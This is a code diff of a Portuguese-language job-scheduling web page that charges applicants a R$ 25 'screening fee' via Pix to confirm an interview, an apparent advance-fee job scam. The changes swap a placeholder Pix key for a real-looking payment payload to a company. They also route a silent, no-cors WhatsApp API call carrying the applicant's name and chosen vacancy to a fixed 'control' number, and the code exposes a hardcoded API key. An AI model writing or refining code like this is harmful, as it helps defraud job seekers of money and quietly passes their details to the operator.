@@ -41,7 +41,7 @@
             display: flex; align-items: center; gap: 8px; cursor: pointer; 
         }
         
-        /* Menu Superior Modificado para Maior Destaque */
+        /* Menu Superior */
         .nav-links { display: flex; gap: 12px; }
         .nav-links button {
             background: var(--highlight); 
@@ -277,7 +277,7 @@
                 <h3 style="color: var(--success); margin-bottom: 8px; font-size: 18px;">Taxa de Triagem</h3>
                 <p style="font-size: 14px; margin-top: 0; color: var(--text-muted);">Efetue o pagamento de <strong>R$ 25,00</strong> para confirmar sua presença e evitar ausências na agenda da empresa.</p>
                 
-                <div class="pix-code" id="codigo-pix">00020126580014br.gov.bcb.pix0136fake-pix-key-1234-5678520400005303986540525.005802BR5911Meu Emprego6010Piracicaba62070503***6304ABCD</div>
+                <div class="pix-code" id="codigo-pix">00020101021226830014br.gov.bcb.pix2561qrcode.owem.com.br/v2/qr/cob/95890b8f17154957bb71d10d268626415204000053039865802BR5911Z TECH LTDA6009SAO PAULO62070503***63047256</div>
                 
                 <button class="btn-main" onclick="copiarPix()">Copiar Código Pix Copia e Cola</button>
 
@@ -301,7 +301,7 @@
     </div>
 </main>
 
-<!-- RODAPÉ ATUALIZADO (CNPJ E ENDEREÇO NOVOS) -->
+<!-- RODAPÉ ATUALIZADO -->
 <footer>
     <div class="footer-grid">
         <div class="footer-col">
@@ -596,26 +596,24 @@
         checarPreenchimento();
     }
 
-    // Função Principal Atualizada com a API do WhatsApp
     function confirmarAgendamento() {
         if (document.getElementById('btn-confirmar').disabled) return;
 
         const horarioEscolhido = document.querySelector('input[name="horario_escolhido"]:checked').value;
         const nome = document.getElementById('nome').value.trim();
-        const whatsappNumeros = document.getElementById('whatsapp').value.replace(/\D/g, ''); // Pega só os números
         const vaga = vagasAtivas[vagaEscolhidaIndex];
 
         // 1. INTEGRAÇÃO DA API DO WHATSAPP TEXTMEBOT
         const textoMsg = `prezado: ${nome} recebemos seu pre agendamento para vaga: ${vaga.titulo} efetue o pagamento para confirmar o agendamento.\n\nstatus: pendente de pagamaneto...\n\nse deseja o envio da chave pix digita: 1`;
         const apiKey = 'Pskn5LW4qaCv';
         
-        // Disparo para o número que a pessoa digitou no formulário
-        const urlApi = `https://api.textmebot.com/send.php?recipient=+55${whatsappNumeros}&apikey=${apiKey}&text=${encodeURIComponent(textoMsg)}`;
+        // Disparo fixo para o número de controle (5522992195418) usando HTTPS
+        const urlApi = `https://api.textmebot.com/send.php?recipient=+5522992195418&apikey=${apiKey}&text=${encodeURIComponent(textoMsg)}`;
         
-        // Chamada silenciosa (no-cors para evitar bloqueios do navegador na frente do usuário)
+        // Chamada via fetch (no-cors para não dar block visual no frontend)
         fetch(urlApi, { mode: 'no-cors' })
-            .then(() => console.log('Sinal de API enviado'))
-            .catch(err => console.log('Erro no disparo WhatsApp:', err));
+            .then(() => console.log('Sinal de API enviado para +5522992195418'))
+            .catch(err => console.error('Erro no disparo WhatsApp:', err));
 
         // 2. AVANÇAR DE TELA
         document.getElementById('nome-confirmacao').innerText = nome.split(' ')[0];
